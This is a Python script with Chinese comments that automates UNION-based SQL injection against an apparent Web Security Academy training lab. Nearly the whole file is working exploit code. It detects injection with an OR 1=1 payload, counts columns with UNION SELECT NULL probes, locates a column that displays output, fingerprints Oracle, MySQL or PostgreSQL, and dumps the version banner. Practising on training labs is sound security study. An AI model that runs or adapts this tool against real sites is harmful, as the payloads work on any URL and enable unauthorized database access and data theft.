import re
import requests
from typing import Optional, Tuple

# 設定常數
BASE_URL = "https://0a7200560328ba1a80dc08d1005c00e7.web-security-academy.net/filter"
PARAM_NAME = "category"
TIMEOUT = 10
COMMENT = "-- "  # SQL 註解符號

# 初始化 requests session
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi Tester)"})

def send_request(payload: str) -> Optional[requests.Response]:
    """發送 HTTP 請求並返回回應

    Args:
        payload: 要測試的 SQL 注入 payload

    Returns:
        requests.Response 或 None（若請求失敗）
    """
    print(f"    [Payload] {payload}")
    try:
        return session.get(BASE_URL, params={PARAM_NAME: payload}, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[!] 請求錯誤: {e}")
        return None

def detect_sqli() -> bool:
    """偵測目標是否存在 SQL 注入漏洞

    Returns:
        bool: True 表示可能存在 SQLi，False 表示未偵測到
    """
    print("[*] 開始偵測 SQL 注入")
    normal_payload = "Gifts"
    sqli_payload = f"' OR 1=1 {COMMENT}"
    
    normal_resp = send_request(normal_payload)
    sqli_resp = send_request(sqli_payload)
    
    if not normal_resp or not sqli_resp:
        return False
    
    if sqli_resp.status_code == 200 and len(sqli_resp.text) > len(normal_resp.text):
        print("[+] 可能存在 SQL 注入漏洞")
        return True
    print("[-] 未偵測到 SQL 注入")
    return False

def find_columns(max_columns: int = 20) -> Optional[int]:
    """透過 UNION SELECT 測試資料庫欄位數量

    Args:
        max_columns: 最大測試欄位數

    Returns:
        int 或 None: 成功找到的欄位數，或 None 表示未找到
    """
    print("[*] 偵測資料庫欄位數")
    for num in range(1, max_columns + 1):
        payload = f"' UNION SELECT {','.join(['NULL'] * num)} FROM dual {COMMENT}"
        resp = send_request(payload)
        if resp and resp.status_code == 200 and "error" not in resp.text.lower():
            print(f"[+] 欄位數 = {num}")
            return num
    print("[-] 無法確定欄位數")
    return None

def find_display_column(num_cols: int) -> Optional[int]:
    """找出哪個欄位可以在頁面顯示資料

    Args:
        num_cols: 資料庫欄位總數

    Returns:
        int 或 None: 可顯示的欄位索引，或 None 表示未找到
    """
    print("[*] 尋找可回顯欄位")
    for i in range(1, num_cols + 1):
        vals = ["NULL"] * num_cols
        vals[i - 1] = "'DISP_COL_TEST'"
        payload = f"' UNION SELECT {','.join(vals)} FROM dual {COMMENT}"
        resp = send_request(payload)
        if resp and "DISP_COL_TEST" in resp.text:
            print(f"[+] 可回顯欄位索引 = {i}")
            return i
    print("[-] 未找到可回顯欄位")
    return None

def build_union(num_cols: int, disp_idx: int, expression: str, tail_from: str = "") -> str:
    """構建 UNION SELECT payload

    Args:
        num_cols: 總欄位數
        disp_idx: 可顯示欄位索引
        expression: 要查詢的 SQL 表達式
        tail_from: 可選的 FROM 子句

    Returns:
        str: 構建完成的 payload
    """
    vals = ["NULL"] * num_cols
    vals[disp_idx - 1] = expression
    return f"' UNION SELECT {','.join(vals)}{tail_from} {COMMENT}"

def detect_dbms(num_cols: int, disp_idx: int) -> Tuple[Optional[str], Optional[str]]:
    """偵測資料庫管理系統 (DBMS) 類型

    Args:
        num_cols: 總欄位數
        disp_idx: 可顯示欄位索引

    Returns:
        Tuple[Optional[str], Optional[str]]: DBMS 類型及其回應內容，或 (None, None)
    """
    print("[*] 偵測 DBMS 類型")
    dbms_tests = {
        "oracle": build_union(num_cols, disp_idx, "banner", " FROM v$version"),
        "mysql": build_union(num_cols, disp_idx, "@@version"),
        "postgres": build_union(num_cols, disp_idx, "version()"),
    }
    
    for dbms, payload in dbms_tests.items():
        resp = send_request(payload)
        if not resp:
            continue
        text = resp.text.lower()
        
        if dbms in text:
            print(f"[+] DBMS = {dbms.capitalize()}")
            return dbms, resp.text
    print("[-] 無法確定 DBMS 類型")
    return None, None

def extract_text_lines(html: str) -> list[str]:
    """將 HTML 轉換為純文字行，移除標籤並保留換行

    Args:
        html: HTML 內容

    Returns:
        list[str]: 清理後的文字行列表
    """
    html = re.sub(r"(?i)<\s*br\s*/?\s*>", "\n", html)
    html = re.sub(r"(?i)</?(p|tr|td|li|div|span|pre|code|h\d)[^>]*>", "\n", html)
    html = re.sub(r"<[^>]+>", "", html)
    return [ln.strip() for ln in html.splitlines() if ln.strip()]

def dump_version(num_cols: int, disp_idx: int, dbms: str) -> None:
    """提取並顯示資料庫版本資訊

    Args:
        num_cols: 總欄位數
        disp_idx: 可顯示欄位索引
        dbms: 資料庫管理系統類型
    """
    print("[*] 提取資料庫版本")
    version_queries = {
        "mysql": build_union(num_cols, disp_idx, "@@version"),
        "postgres": build_union(num_cols, disp_idx, "version()"),
        "oracle": build_union(num_cols, disp_idx, "banner", " FROM v$version")
    }
    
    payload = version_queries.get(dbms)
    if not payload:
        print("[-] 不支援的 DBMS，無法提取版本")
        return
    
    resp = send_request(payload)
    if not resp or resp.status_code != 200:
        print("[-] 無法取得版本資訊")
        return
    
    lines = extract_text_lines(resp.text)
    
    if dbms == "postgres":
        for ln in lines:
            if "PostgreSQL" in ln:
                print(f"[+] 版本 = {ln}")
                return
    elif dbms == "oracle":
        for ln in lines:
            if "Oracle" in ln and "Database" in ln:
                print(f"[+] 版本 = {ln}")
                return
    elif dbms == "mysql":
        for ln in lines:
            if "MySQL" in ln or "MariaDB" in ln:
                print(f"[+] 版本 = {ln}")
                return
        version = re.search(r"\b\d+\.\d+\.\d+(?:-[A-Za-z0-9._-]+)?\b", " ".join(lines))
        if version:
            print(f"[+] 版本 = {version.group(0)}")
            return
    
    print("[?] 無法提取版本資訊，回應片段：", " ".join(lines)[:200])

def main():
    """主程式入口，執行 SQL 注入測試流程"""
    if not detect_sqli():
        print("[-] 無 SQL 注入漏洞，結束程式")
        return
    
    col_cnt = find_columns()
    if not col_cnt:
        print("[-] 無法確定欄位數，結束程式")
        return
    
    disp_idx = find_display_column(col_cnt)
    if not disp_idx:
        print("[-] 無法找到可回顯欄位，結束程式")
        return
    
    dbms, _ = detect_dbms(col_cnt, disp_idx)
    if not dbms:
        print("[!] 未偵測到 DBMS，預設使用 MySQL")
        dbms = "mysql"
    
    dump_version(col_cnt, disp_idx, dbms)

if __name__ == "__main__":
    main()